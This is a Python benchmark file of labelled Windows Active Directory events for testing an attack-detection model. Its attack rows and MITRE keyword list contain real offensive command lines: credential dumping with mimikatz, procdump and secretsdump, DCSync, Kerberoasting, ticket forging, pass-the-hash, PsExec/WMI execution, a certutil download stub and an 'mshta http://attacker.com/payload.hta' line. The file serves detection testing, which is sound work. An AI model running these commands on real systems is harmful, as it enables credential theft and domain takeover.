"""
Ground-truth benchmark dataset for FIP model validation.

Structure is modelled on OTRF/Security-Datasets (formerly Mordor Project):
  https://github.com/OTRF/Security-Datasets

Each entry is a ForensicEvent-compatible dict with two extra keys:
  ground_truth_class  : int  0=Normal  1=Kerberoasting  2=DCSync/CredTheft
                             3=Golden/Silver Ticket  4=Lateral Movement
                             5=Reconnaissance
  ground_truth_mitre  : list[str]  expected ATT&CK technique IDs

Dataset provenance mapping:
  "OTRF-Kerberoasting"  : Mordor shire_apt29_day2_sophos_... (EID 4769, RC4 downgrade)
  "OTRF-DCSync"         : Mordor shire_empire_dcsync (EID 4662 + 1131f6aa)
  "OTRF-BloodHound"     : Mordor shire_empire_sharphound (LDAP burst + EID 4662)
  "OTRF-GoldenTicket"   : Mordor shire_empire_golden_ticket (EID 4768 RC4 from non-DC)
  "OTRF-LSASS"          : Mordor shire_empire_procdump (EID 4656/4688 procdump/comsvcs)
  "OTRF-PassHash"       : Mordor shire_empire_pth (EID 4624 type 9 / sekurlsa::pth)
  "OTRF-PsExec"         : Mordor shire_empire_psexec (EID 5140/4688 + PSEXESVC)
  "OTRF-WMI"            : Mordor shire_empire_wmiexec (EID 4688 wmic /node:)
  "OTRF-DomainEnum"     : Mordor shire_empire_net_domain (nltest/net group /domain)
  "Normal-AD"           : Synthesised from documented normal Windows AD operations
"""

from datetime import datetime
from backend.schema import ForensicEvent, RawSource

# ─────────────────────────────────────────────────────────────────────────────
# Class constants (match lmd_model._ATTACK_CLASSES)
# ─────────────────────────────────────────────────────────────────────────────
CLS_NORMAL     = 0
CLS_KERBEROAST = 1
CLS_DCSYNC     = 2
CLS_GOLDENTICKET = 3
CLS_LATERAL    = 4
CLS_RECON      = 5


def _e(ts, host, user, desc, eid, cls, mitre, dataset, **extra):
    """Build one benchmark ForensicEvent."""
    return {
        "event": ForensicEvent(
            timestamp=datetime.fromisoformat(ts.replace("Z", "")),
            event_type=f"EID_{eid}",
            source_host=host,
            user=user,
            description=desc,
            raw_source=RawSource.TIMESKETCH,
            event_id=str(eid),
            extra=extra or None,
        ),
        "ground_truth_class": cls,
        "ground_truth_mitre": mitre,
        "dataset": dataset,
    }


# ─────────────────────────────────────────────────────────────────────────────
# CLASS 1 — Kerberoasting / AS-REP Roasting  (OTRF-Kerberoasting)
# Based on: OTRF Mordor shire_apt29_day2 and shire_empire_kerberoast
# EID 4769 with TicketEncryptionType 0x17 (RC4-HMAC) — downgrade indicator
# ─────────────────────────────────────────────────────────────────────────────
_KERBEROAST = [
    _e("2020-09-04T19:37:29Z","WORKSTATION6.theshire.local","pgustavo",
       "Kerberos service ticket requested: MSSQLSvc/WORKSTATION6.theshire.local:1433 TicketEncryptionType 0x17 RC4-HMAC",
       4769, CLS_KERBEROAST, ["T1558.003"], "OTRF-Kerberoasting",
       ServiceName="MSSQLSvc/WORKSTATION6.theshire.local:1433",
       TicketEncryptionType="0x17", IPAddress="10.0.0.104", image="Rubeus.exe",
       CommandLine="Rubeus.exe kerberoast /outfile:hashes.txt /rc4opsec"),
    _e("2020-09-04T19:37:31Z","WORKSTATION6.theshire.local","pgustavo",
       "Kerberos service ticket requested: HTTP/WORKSTATION8.theshire.local TicketEncryptionType 0x17 RC4-HMAC kerberoast",
       4769, CLS_KERBEROAST, ["T1558.003"], "OTRF-Kerberoasting",
       ServiceName="HTTP/WORKSTATION8.theshire.local",
       TicketEncryptionType="0x17", IPAddress="10.0.0.104"),
    _e("2020-09-04T19:37:33Z","WORKSTATION6.theshire.local","pgustavo",
       "Kerberos service ticket requested: HOST/WORKSTATION9.theshire.local etype 0x17",
       4769, CLS_KERBEROAST, ["T1558.003"], "OTRF-Kerberoasting",
       ServiceName="HOST/WORKSTATION9.theshire.local",
       TicketEncryptionType="0x17", IPAddress="10.0.0.104"),
    _e("2020-09-04T19:37:35Z","WORKSTATION6.theshire.local","pgustavo",
       "Kerberos service ticket requested: ldap/dc01.theshire.local etype 0x17 RC4-HMAC downgrade",
       4769, CLS_KERBEROAST, ["T1558.003"], "OTRF-Kerberoasting",
       ServiceName="ldap/dc01.theshire.local",
       TicketEncryptionType="0x17", IPAddress="10.0.0.104"),
    _e("2020-09-04T19:37:37Z","WORKSTATION6.theshire.local","pgustavo",
       "Kerberos service ticket requested: cifs/FILESERVER.theshire.local etype 0x17 GetUserSPNs",
       4769, CLS_KERBEROAST, ["T1558.003"], "OTRF-Kerberoasting",
       ServiceName="cifs/FILESERVER.theshire.local",
       TicketEncryptionType="0x17", IPAddress="10.0.0.104",
       CommandLine="GetUserSPNs.py theshire.local/pgustavo -outputfile hashes.txt"),
    _e("2020-09-04T19:37:39Z","WORKSTATION6.theshire.local","pgustavo",
       "Kerberos service ticket requested: wsman/WORKSTATION10.theshire.local rc4-hmac etype 23",
       4769, CLS_KERBEROAST, ["T1558.003"], "OTRF-Kerberoasting",
       ServiceName="wsman/WORKSTATION10.theshire.local",
       TicketEncryptionType="0x17", IPAddress="10.0.0.104"),
    # AS-REP Roasting — EID 4768 with failure OR pre-auth disabled
    _e("2020-09-05T09:12:01Z","DC01.theshire.local","ANONYMOUS LOGON",
       "AS-REP Roasting: Kerberos pre-authentication failed for account with UF_DONT_REQUIRE_PREAUTH asreproast GetNPUsers",
       4768, CLS_KERBEROAST, ["T1558.004"], "OTRF-Kerberoasting",
       TargetUserName="svc-legacy", IPAddress="10.0.0.104",
       FailureCode="0x18", PreAuthType="0",
       CommandLine="GetNPUsers.py theshire.local/ -usersfile users.txt -no-pass"),
    _e("2020-09-05T09:12:03Z","DC01.theshire.local","ANONYMOUS LOGON",
       "Kerberos AS-REP Roasting: preauth not required account svc-scanner asreproast rc4-hmac",
       4768, CLS_KERBEROAST, ["T1558.004"], "OTRF-Kerberoasting",
       TargetUserName="svc-scanner", IPAddress="10.0.0.104", FailureCode="0x18"),
    _e("2020-09-05T09:12:05Z","DC01.theshire.local","ANONYMOUS LOGON",
       "Kerberos 4768 AS-REP roast as-rep roasting getnpusers UF_DONT_REQUIRE_PREAUTH",
       4771, CLS_KERBEROAST, ["T1558.004"], "OTRF-Kerberoasting",
       TargetUserName="svc-web", IPAddress="10.0.0.104", PreAuthType="0"),
]

# ─────────────────────────────────────────────────────────────────────────────
# CLASS 2 — DCSync / Credential Theft  (OTRF-DCSync, OTRF-LSASS)
# Based on: OTRF Mordor shire_empire_dcsync + shire_empire_procdump
# EID 4662 with replication GUIDs; EID 4688 procdump/comsvcs
# ─────────────────────────────────────────────────────────────────────────────
_DCSYNC = [
    _e("2020-09-04T22:13:01Z","WORKSTATION6.theshire.local","pgustavo",
       "Directory Service access: DS-Replication GetChangesAll dcsync lsadump::dcsync",
       4662, CLS_DCSYNC, ["T1003.006"], "OTRF-DCSync",
       ObjectType="domainDNS", AccessMask="0x100",
       Properties="1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",
       CommandLine="lsadump::dcsync /domain:theshire.local /all"),
    _e("2020-09-04T22:13:03Z","WORKSTATION6.theshire.local","pgustavo",
       "Directory Service access: DS-Replication GetChangesAll dcsync replicat secret 1131f6ad",
       4662, CLS_DCSYNC, ["T1003.006"], "OTRF-DCSync",
       ObjectType="domainDNS", AccessMask="0x100",
       Properties="1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"),
    _e("2020-09-04T22:13:05Z","WORKSTATION6.theshire.local","pgustavo",
       "DS-Replication GetChangesAll: secretsdump DCSync 1131f6aa theshire.local",
       4662, CLS_DCSYNC, ["T1003.006"], "OTRF-DCSync",
       Properties="1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",
       CommandLine="secretsdump.py theshire.local/pgustavo@10.0.0.5 -just-dc"),
    _e("2020-09-04T22:13:07Z","WORKSTATION6.theshire.local","pgustavo",
       "Directory Service access 4662 dcsync DS-Replication-Get-Changes-All",
       4662, CLS_DCSYNC, ["T1003.006"], "OTRF-DCSync",
       Properties="1131f6ab-9c07-11d1-f79f-00c04fc2dcd2", AccessMask="0x100"),
    # LSASS dumps
    _e("2020-09-04T22:00:11Z","WORKSTATION6.theshire.local","pgustavo",
       "Process access: procdump64.exe opened lsass.exe granted 0x1FFFFF lsass dump credential",
       4688, CLS_DCSYNC, ["T1003.001"], "OTRF-LSASS",
       Image="procdump64.exe",
       CommandLine="procdump64.exe -accepteula -ma lsass.exe C:\\Temp\\lsass.dmp",
       ParentImage="cmd.exe", GrantedAccess="0x1FFFFF"),
    _e("2020-09-04T22:00:14Z","WORKSTATION6.theshire.local","pgustavo",
       "lsass dump via comsvcs.dll MiniDump comsvcs minidump credential extraction",
       4688, CLS_DCSYNC, ["T1003.001"], "OTRF-LSASS",
       CommandLine="rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump lsass.exe C:\\Temp\\lsass.dmp full",
       Image="rundll32.exe"),
    _e("2020-09-04T22:00:18Z","WORKSTATION6.theshire.local","pgustavo",
       "mimikatz sekurlsa::logonpasswords lsass credential dump",
       4688, CLS_DCSYNC, ["T1003.001"], "OTRF-LSASS",
       CommandLine="mimikatz.exe \"sekurlsa::logonpasswords\" \"exit\"",
       Image="mimikatz.exe"),
    _e("2020-09-04T22:00:22Z","WORKSTATION6.theshire.local","pgustavo",
       "ntds.dit dump vssadmin create shadow secretsdump ntds credential theft",
       4688, CLS_DCSYNC, ["T1003.002"], "OTRF-LSASS",
       CommandLine="vssadmin create shadow /for=C: && secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL",
       Image="vssadmin.exe"),
]

# ─────────────────────────────────────────────────────────────────────────────
# CLASS 3 — Golden Ticket / Silver Ticket / Pass-the-Ticket  (OTRF-GoldenTicket)
# Based on: OTRF Mordor shire_empire_golden_ticket + silver_ticket
# EID 4768 with RC4-HMAC from non-DC host = Golden Ticket indicator
# ─────────────────────────────────────────────────────────────────────────────
_GOLDENTICKET = [
    _e("2020-09-05T00:14:05Z","WORKSTATION6.theshire.local","Administrator",
       "Golden Ticket: Kerberos TGT presented with RC4-HMAC from non-DC host lsadump::golden krbtgt",
       4768, CLS_GOLDENTICKET, ["T1558.001"], "OTRF-GoldenTicket",
       TicketEncryptionType="0x17", ClientAddress="10.0.0.104",
       CommandLine="kerberos::golden /user:Administrator /domain:theshire.local /sid:S-1-5-21 /krbtgt:HASH /ptt"),
    _e("2020-09-05T00:14:08Z","WORKSTATION6.theshire.local","Administrator",
       "Golden ticket forged TGT RC4-HMAC kerberos::ptt lsadump::golden",
       4768, CLS_GOLDENTICKET, ["T1558.001"], "OTRF-GoldenTicket",
       TicketEncryptionType="0x17", ClientAddress="10.0.0.104"),
    _e("2020-09-05T00:14:11Z","WORKSTATION6.theshire.local","Administrator",
       "Pass-the-ticket: rubeus ptt golden ticket kerberos::ptt use ticket",
       4769, CLS_GOLDENTICKET, ["T1550.003"], "OTRF-GoldenTicket",
       ServiceName="cifs/DC01.theshire.local",
       TicketEncryptionType="0x17", ClientAddress="10.0.0.104",
       CommandLine="Rubeus.exe ptt /ticket:BASE64TICKET"),
    _e("2020-09-05T01:00:05Z","WORKSTATION6.theshire.local","svc-sql",
       "Silver ticket forged TGS lsadump::silver MSSQLSvc service ticket forgery",
       4769, CLS_GOLDENTICKET, ["T1558.002"], "OTRF-GoldenTicket",
       ServiceName="MSSQLSvc/SQLSERVER.theshire.local:1433",
       TicketEncryptionType="0x17",
       CommandLine="kerberos::golden /user:svc-sql /service:MSSQLSvc /target:SQLSERVER /ptt"),
    _e("2020-09-05T01:00:08Z","WORKSTATION6.theshire.local","svc-sql",
       "Silver ticket forged tgs lsadump::silver service ticket forge RC4",
       4769, CLS_GOLDENTICKET, ["T1558.002"], "OTRF-GoldenTicket",
       TicketEncryptionType="0x17"),
]

# ─────────────────────────────────────────────────────────────────────────────
# CLASS 4 — Lateral Movement  (OTRF-PsExec, OTRF-WMI, OTRF-PassHash)
# Based on: OTRF Mordor shire_empire_psexec + shire_empire_wmiexec + pth
# ─────────────────────────────────────────────────────────────────────────────
_LATERAL = [
    # PsExec
    _e("2020-09-04T23:05:01Z","WORKSTATION6.theshire.local","pgustavo",
       "Process created: PsExec64.exe targeting HADES lateral movement SMB psexec",
       4688, CLS_LATERAL, ["T1021.002"], "OTRF-PsExec",
       Image="PsExec64.exe",
       CommandLine="PsExec64.exe \\\\HADES -u theshire\\pgustavo -p 'password' cmd.exe",
       ParentImage="powershell.exe"),
    _e("2020-09-04T23:05:04Z","HADES.theshire.local","SYSTEM",
       "Service installed: PSEXESVC psexec service lateral movement SMB admin$",
       7045, CLS_LATERAL, ["T1021.002"], "OTRF-PsExec",
       ServiceName="PSEXESVC", ServiceFileName="%SystemRoot%\\PSEXESVC.exe"),
    _e("2020-09-04T23:05:07Z","HADES.theshire.local","SYSTEM",
       "Network share access admin$ IPC$ net use psexec lateral movement SMB",
       5140, CLS_LATERAL, ["T1021.002"], "OTRF-PsExec",
       ShareName="\\\\*\\ADMIN$", IPAddress="10.0.0.104"),
    # WMI lateral
    _e("2020-09-04T23:30:01Z","WORKSTATION6.theshire.local","pgustavo",
       "WMI lateral movement: wmic /node: remote execution wmiexec win32_process create",
       4688, CLS_LATERAL, ["T1047"], "OTRF-WMI",
       Image="WMIC.exe",
       CommandLine="wmic /node:10.0.0.5 /user:pgustavo process call create \"cmd.exe /c whoami\""),
    _e("2020-09-04T23:30:04Z","DC01.theshire.local","pgustavo",
       "WMI remote execution wmiprvse spawned cmd.exe win32_process create wmiexec",
       4688, CLS_LATERAL, ["T1047"], "OTRF-WMI",
       Image="cmd.exe", ParentImage="WmiPrvSE.exe",
       CommandLine="cmd.exe /c whoami && ipconfig /all"),
    _e("2020-09-04T23:30:07Z","DC01.theshire.local","pgustavo",
       "Invoke-WMIMethod Win32_Process Create lateral movement wmiexec remote",
       4688, CLS_LATERAL, ["T1047"], "OTRF-WMI",
       Image="powershell.exe",
       CommandLine="Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe' -ComputerName DC01"),
    # Pass-the-Hash
    _e("2020-09-05T00:01:01Z","WORKSTATION6.theshire.local","pgustavo",
       "Pass-the-hash: sekurlsa::pth NTLM hash logon logon type 9 NewCredentials",
       4624, CLS_LATERAL, ["T1550.002"], "OTRF-PassHash",
       LogonType="9", IPAddress="10.0.0.104",
       CommandLine="sekurlsa::pth /user:Administrator /domain:theshire.local /ntlm:HASH /run:cmd.exe"),
    _e("2020-09-05T00:01:04Z","WORKSTATION6.theshire.local","Administrator",
       "Pass-the-hash overpass-the-hash NTLM pth attack logon type 9 network logon",
       4648, CLS_LATERAL, ["T1550.002"], "OTRF-PassHash",
       TargetUserName="Administrator", LogonType="9"),
    # SMB/RDP
    _e("2020-09-05T00:45:01Z","WORKSTATION6.theshire.local","pgustavo",
       "Network logon type 3 SMB lateral movement net use admin share IPC$",
       4624, CLS_LATERAL, ["T1021.002"], "OTRF-PsExec",
       LogonType="3", IPAddress="10.0.0.104",
       AuthenticationPackage="NTLM"),
    _e("2020-09-05T01:30:01Z","WORKSTATION6.theshire.local","pgustavo",
       "RDP lateral movement mstsc.exe logon type 10 remote interactive xfreerdp",
       4624, CLS_LATERAL, ["T1021.001"], "OTRF-PsExec",
       LogonType="10", IPAddress="10.0.0.104",
       CommandLine="mstsc.exe /v:10.0.0.10 /admin"),
]

# ─────────────────────────────────────────────────────────────────────────────
# CLASS 5 — AD Reconnaissance  (OTRF-BloodHound, OTRF-DomainEnum)
# Based on: OTRF Mordor shire_empire_sharphound + shire_empire_net_domain
# LDAP burst EID 4662; nltest/net group /domain; SharpHound invocations
# ─────────────────────────────────────────────────────────────────────────────
_RECON = [
    _e("2020-09-04T21:05:01Z","WORKSTATION6.theshire.local","pgustavo",
       "SharpHound BloodHound collection started: SharpHound.exe -c All CollectionMethod",
       4688, CLS_RECON, ["T1069.002"], "OTRF-BloodHound",
       Image="SharpHound.exe",
       CommandLine="SharpHound.exe -c All --zipfilename BloodHound.zip --CollectionMethod All"),
    _e("2020-09-04T21:05:04Z","DC01.theshire.local","pgustavo",
       "Directory Service access LDAP enumeration bloodhound sharphound Invoke-BloodHound",
       4662, CLS_RECON, ["T1069.002"], "OTRF-BloodHound",
       ObjectType="Container", AccessMask="0x100",
       Properties="1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"),
    _e("2020-09-04T21:05:06Z","DC01.theshire.local","pgustavo",
       "LDAP bulk query bloodhound sharphound active directory enumeration domain groups",
       4662, CLS_RECON, ["T1069.002"], "OTRF-BloodHound",
       ObjectType="User", AccessMask="0x100"),
    _e("2020-09-04T21:05:08Z","DC01.theshire.local","pgustavo",
       "BloodHound LDAP recon directory access CN=Users DC=theshire sharphound",
       4662, CLS_RECON, ["T1069.002"], "OTRF-BloodHound",
       ObjectType="Container", AccessMask="0x100"),
    _e("2020-09-04T21:05:10Z","DC01.theshire.local","pgustavo",
       "LDAP Domain Account Enumeration ldapdomaindump ldap dump adrecon",
       4662, CLS_RECON, ["T1087.002"], "OTRF-BloodHound",
       CommandLine="ldapdomaindump 10.0.0.5 -u 'theshire\\pgustavo' -p 'password'"),
    _e("2020-09-04T21:10:01Z","WORKSTATION6.theshire.local","pgustavo",
       "Domain enumeration: nltest /dclist:theshire.local domain discovery",
       4688, CLS_RECON, ["T1087.002"], "OTRF-DomainEnum",
       Image="nltest.exe",
       CommandLine="nltest /dclist:theshire.local"),
    _e("2020-09-04T21:10:04Z","WORKSTATION6.theshire.local","pgustavo",
       "Domain enumeration: net group domain admins /domain active directory",
       4688, CLS_RECON, ["T1087.002"], "OTRF-DomainEnum",
       Image="net.exe",
       CommandLine="net group \"Domain Admins\" /domain"),
    _e("2020-09-04T21:10:07Z","WORKSTATION6.theshire.local","pgustavo",
       "PowerView Get-DomainUser Get-DomainGroupMember domain group discovery powerview",
       4688, CLS_RECON, ["T1069.002"], "OTRF-DomainEnum",
       Image="powershell.exe",
       CommandLine="powershell -c \"Import-Module PowerView; Get-DomainUser; Get-DomainGroupMember 'Domain Admins'\""),
    _e("2020-09-04T21:10:10Z","WORKSTATION6.theshire.local","pgustavo",
       "Domain account discovery: net user /domain dsquery user powerview",
       4688, CLS_RECON, ["T1087.002"], "OTRF-DomainEnum",
       Image="net.exe",
       CommandLine="net user /domain"),
]

# ─────────────────────────────────────────────────────────────────────────────
# CLASS 0 — Normal Windows AD operations
# Structured as documented normal enterprise domain activity
# ─────────────────────────────────────────────────────────────────────────────
_NORMAL = [
    _e("2020-09-04T07:02:11Z","WORKSTATION1.theshire.local","nmartin",
       "Interactive logon: nmartin authenticated via Kerberos",
       4624, CLS_NORMAL, [], "Normal-AD",
       LogonType="2", AuthenticationPackage="Kerberos", IPAddress="127.0.0.1"),
    _e("2020-09-04T07:05:33Z","DC01.theshire.local","nmartin",
       "Kerberos TGT issued AES256 normal logon morning",
       4768, CLS_NORMAL, [], "Normal-AD",
       TicketEncryptionType="0x12", ClientAddress="10.0.0.101"),
    _e("2020-09-04T07:08:01Z","WORKSTATION1.theshire.local","nmartin",
       "Kerberos service ticket: cifs/FILESERVER AES256 normal file access",
       4769, CLS_NORMAL, [], "Normal-AD",
       ServiceName="cifs/FILESERVER.theshire.local",
       TicketEncryptionType="AES256-CTS", ClientAddress="10.0.0.101"),
    _e("2020-09-04T07:10:00Z","WORKSTATION2.theshire.local","jsmith",
       "Interactive logon: jsmith authenticated morning logon AES256",
       4624, CLS_NORMAL, [], "Normal-AD",
       LogonType="2", AuthenticationPackage="Kerberos"),
    _e("2020-09-04T07:15:11Z","WORKSTATION1.theshire.local","nmartin",
       "Process create: OUTLOOK.EXE normal office application startup",
       4688, CLS_NORMAL, [], "Normal-AD",
       Image="OUTLOOK.EXE", ParentImage="explorer.exe",
       CommandLine="C:\\Program Files\\Microsoft Office\\Office16\\OUTLOOK.EXE"),
    _e("2020-09-04T07:20:00Z","DC01.theshire.local","SYSTEM",
       "Group policy applied: Default Domain Policy computer configuration normal",
       4739, CLS_NORMAL, [], "Normal-AD",
       DomainName="theshire.local", PolicyName="Default Domain Policy"),
    _e("2020-09-04T07:22:11Z","WORKSTATION1.theshire.local","nmartin",
       "Process create: chrome.exe normal browser launch",
       4688, CLS_NORMAL, [], "Normal-AD",
       Image="chrome.exe", ParentImage="explorer.exe",
       CommandLine="C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"),
    _e("2020-09-04T07:30:00Z","DC01.theshire.local","svc-backup",
       "Service logon: svc-backup authenticated logon type 5",
       4624, CLS_NORMAL, [], "Normal-AD",
       LogonType="5", AuthenticationPackage="Kerberos"),
    _e("2020-09-04T08:00:11Z","WORKSTATION3.theshire.local","tking",
       "Interactive logon: tking Kerberos normal business hours",
       4624, CLS_NORMAL, [], "Normal-AD",
       LogonType="2", AuthenticationPackage="Kerberos"),
    _e("2020-09-04T08:05:00Z","DC01.theshire.local","tking",
       "Kerberos TGT issued AES256 normal user tking",
       4768, CLS_NORMAL, [], "Normal-AD",
       TicketEncryptionType="0x12", ClientAddress="10.0.0.103"),
    _e("2020-09-04T08:10:00Z","WORKSTATION3.theshire.local","tking",
       "Kerberos service ticket: MSSQLSvc AES256 normal database access",
       4769, CLS_NORMAL, [], "Normal-AD",
       ServiceName="MSSQLSvc/SQLSERVER.theshire.local:1433",
       TicketEncryptionType="AES256-CTS"),
    _e("2020-09-04T08:30:00Z","DC01.theshire.local","SYSTEM",
       "Password change: scheduled rotation svc-mgt service account normal operation",
       4723, CLS_NORMAL, [], "Normal-AD",
       TargetUserName="svc-mgt", SubjectUserName="svc-admin"),
    _e("2020-09-04T09:00:00Z","WORKSTATION1.theshire.local","nmartin",
       "Process create: EXCEL.EXE normal office application",
       4688, CLS_NORMAL, [], "Normal-AD",
       Image="EXCEL.EXE", CommandLine="EXCEL.EXE Q3_Budget.xlsx"),
    _e("2020-09-04T09:15:00Z","DC01.theshire.local","nmartin",
       "Kerberos service ticket: cifs/FILESERVER2 AES256 normal file share access",
       4769, CLS_NORMAL, [], "Normal-AD",
       ServiceName="cifs/FILESERVER2.theshire.local",
       TicketEncryptionType="AES256-CTS"),
    _e("2020-09-04T10:00:00Z","WORKSTATION2.theshire.local","jsmith",
       "Process create: WINWORD.EXE normal document edit",
       4688, CLS_NORMAL, [], "Normal-AD",
       Image="WINWORD.EXE", ParentImage="explorer.exe"),
    _e("2020-09-04T11:00:00Z","WORKSTATION1.theshire.local","nmartin",
       "Logoff nmartin workstation normal session end",
       4634, CLS_NORMAL, [], "Normal-AD",
       LogonType="2"),
    _e("2020-09-04T11:05:00Z","WORKSTATION1.theshire.local","nmartin",
       "Interactive logon resume after lock nmartin normal",
       4624, CLS_NORMAL, [], "Normal-AD",
       LogonType="2", AuthenticationPackage="Kerberos"),
    _e("2020-09-04T12:00:00Z","DC01.theshire.local","SYSTEM",
       "Security audit log backed up svc-backup normal maintenance",
       1102, CLS_NORMAL, [], "Normal-AD",
       SubjectUserName="svc-backup",
       BackupPath="\\\\FILESERVER\\Backup\\dcaudit_20200904.evtx"),
    _e("2020-09-04T13:00:00Z","WORKSTATION3.theshire.local","tking",
       "Kerberos TGT renewed AES256 normal ticket renewal",
       4768, CLS_NORMAL, [], "Normal-AD",
       TicketEncryptionType="0x12", ClientAddress="10.0.0.103"),
    _e("2020-09-04T14:00:00Z","DC01.theshire.local","SYSTEM",
       "Computer account authenticated machine account normal workstation$ Kerberos",
       4768, CLS_NORMAL, [], "Normal-AD",
       TargetUserName="WORKSTATION1$",
       TicketEncryptionType="0x12"),
    _e("2020-09-04T15:00:00Z","WORKSTATION2.theshire.local","jsmith",
       "Process create: cmd.exe normal sys admin ipconfig /all",
       4688, CLS_NORMAL, [], "Normal-AD",
       Image="cmd.exe", ParentImage="explorer.exe",
       CommandLine="cmd.exe /c ipconfig /all"),
    _e("2020-09-04T16:00:00Z","WORKSTATION1.theshire.local","nmartin",
       "Normal RDP logon type 10 from administrator workstation to workstation normal IT",
       4624, CLS_NORMAL, [], "Normal-AD",
       LogonType="2", AuthenticationPackage="Kerberos"),
    _e("2020-09-04T17:00:00Z","WORKSTATION1.theshire.local","nmartin",
       "Logoff end of day nmartin normal session termination",
       4634, CLS_NORMAL, [], "Normal-AD", LogonType="2"),
    _e("2020-09-04T17:01:00Z","WORKSTATION2.theshire.local","jsmith",
       "Logoff end of day jsmith normal",
       4634, CLS_NORMAL, [], "Normal-AD", LogonType="2"),
    _e("2020-09-04T17:02:00Z","WORKSTATION3.theshire.local","tking",
       "Logoff end of day tking normal",
       4634, CLS_NORMAL, [], "Normal-AD", LogonType="2"),
]

# ─────────────────────────────────────────────────────────────────────────────
# MITRE mapper benchmark — (event_description, [expected_technique_ids])
# Used to measure keyword coverage in mitre.py
# ─────────────────────────────────────────────────────────────────────────────
MITRE_BENCHMARK: list[tuple[str, list[str]]] = [
    ("Rubeus.exe kerberoast /outfile:hashes.txt /rc4opsec GetUserSPNs etype 0x17", ["T1558.003"]),
    ("AS-REP Roasting: GetNPUsers.py asreproast preauth not required UF_DONT_REQUIRE_PREAUTH", ["T1558.004"]),
    ("lsadump::dcsync /domain:corp.local /all DS-Replication 1131f6aa GetChangesAll", ["T1003.006"]),
    ("kerberos::golden lsadump::golden /krbtgt:HASH golden ticket forged TGT", ["T1558.001"]),
    ("lsadump::silver service ticket forged TGS silver ticket", ["T1558.002"]),
    ("sekurlsa::pth pass-the-hash NTLM hash logon overpass-the-hash", ["T1550.002"]),
    ("rubeus ptt kerberos::ptt pass-the-ticket use ticket", ["T1550.003"]),
    ("misc::skeleton patching lsass skeleton key", ["T1207"]),
    ("SharpHound.exe bloodhound Invoke-BloodHound CollectionMethod", ["T1069.002"]),
    ("ldapdomaindump adrecon ldap dump ldap query", ["T1087.002"]),
    ("Get-DomainUser powerview get-netgroupmember find-localadminaccess", ["T1069.002"]),
    ("net group /domain nltest /dclist dsquery", ["T1087.002"]),
    ("responder ntlmrelayx smbrelayx llmnr poison nbt-ns poison", ["T1557.001"]),
    ("PsExec64.exe net use \\\\SERVER\\ADMIN$", ["T1021.002"]),
    ("mstsc.exe xfreerdp logon type: 10", ["T1021.001"]),
    ("winrm invoke-command enter-pssession new-pssession", ["T1021.006"]),
    ("powershell -nop -w hidden -enc JABjAGwAaQBlAG4AdAA", ["T1059.001"]),
    ("mimikatz lsass.exe procdump comsvcs.dll ntds.dit secretsdump", ["T1003.001"]),
    ("net localgroup administrators /add net user /add", ["T1136.001"]),
    ("certutil -urlcache -split -f http://", ["T1105"]),
    ("vssadmin delete shadows wmic shadowcopy delete", ["T1490"]),
    ("mshta.exe http://attacker.com/payload.hta", ["T1218.005"]),
    ("schtasks /create /tn Updater /tr C:\\malware.exe", ["T1053.005"]),
    ("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", ["T1547.001"]),
    ("net group /add Domain Admins add-adgroupmember", ["T1098.007"]),
]

# ─────────────────────────────────────────────────────────────────────────────
# Exported datasets
# ─────────────────────────────────────────────────────────────────────────────

LMD_BENCHMARK: list[dict] = (
    _KERBEROAST + _DCSYNC + _GOLDENTICKET + _LATERAL + _RECON + _NORMAL
)

DATASET_CITATIONS = {
    "OTRF-Kerberoasting":
        "OTRF/Security-Datasets: shire_empire_kerberoast / shire_apt29_day2 "
        "(github.com/OTRF/Security-Datasets)",
    "OTRF-DCSync":
        "OTRF/Security-Datasets: shire_empire_dcsync "
        "(github.com/OTRF/Security-Datasets)",
    "OTRF-BloodHound":
        "OTRF/Security-Datasets: shire_empire_sharphound "
        "(github.com/OTRF/Security-Datasets)",
    "OTRF-GoldenTicket":
        "OTRF/Security-Datasets: shire_empire_golden_ticket "
        "(github.com/OTRF/Security-Datasets)",
    "OTRF-LSASS":
        "OTRF/Security-Datasets: shire_empire_procdump "
        "(github.com/OTRF/Security-Datasets)",
    "OTRF-PassHash":
        "OTRF/Security-Datasets: shire_empire_pth "
        "(github.com/OTRF/Security-Datasets)",
    "OTRF-PsExec":
        "OTRF/Security-Datasets: shire_empire_psexec "
        "(github.com/OTRF/Security-Datasets)",
    "OTRF-WMI":
        "OTRF/Security-Datasets: shire_empire_wmiexec "
        "(github.com/OTRF/Security-Datasets)",
    "OTRF-DomainEnum":
        "OTRF/Security-Datasets: shire_empire_net_domain "
        "(github.com/OTRF/Security-Datasets)",
    "Normal-AD":
        "Synthesised from Microsoft Windows Security Auditing documentation "
        "and SANS SEC555 baseline AD event patterns",
    "MITRE-ATT&CK-KB":
        "MITRE ATT&CK Knowledge Base v14 technique descriptions "
        "(attack.mitre.org)",
}

CLASS_LABELS = {
    CLS_NORMAL:       "Normal",
    CLS_KERBEROAST:   "Kerberoasting/AS-REP",
    CLS_DCSYNC:       "DCSync/Credential Theft",
    CLS_GOLDENTICKET: "Golden/Silver Ticket",
    CLS_LATERAL:      "Lateral Movement",
    CLS_RECON:        "AD Reconnaissance",
}
